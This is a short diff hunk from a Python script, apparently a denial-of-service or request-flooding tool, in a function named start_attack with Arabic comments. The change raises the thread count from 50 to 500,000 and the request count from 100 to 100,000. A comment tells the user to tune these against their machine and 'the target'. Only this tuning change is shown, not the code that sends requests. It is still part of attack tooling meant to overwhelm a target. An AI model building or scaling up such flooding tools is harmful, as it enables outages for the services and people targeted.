@@ -56,8 +56,8 @@ def start_attack(message):
         start_time = time.time()  # بدء المؤقت
 
         # زيادة عدد الخيوط
-        max_workers = 50  # يمكنك تعديل هذا الرقم بناءً على قدرة جهازك والهدف
-        num_requests = 100  # يمكنك أيضاً تعديل عدد الطلبات
+        max_workers = 500000  # يمكنك تعديل هذا الرقم بناءً على قدرة جهازك والهدف
+        num_requests = 100000  # يمكنك أيضاً تعديل عدد الطلبات
 
         with attack_lock:
             attack_in_progress = True
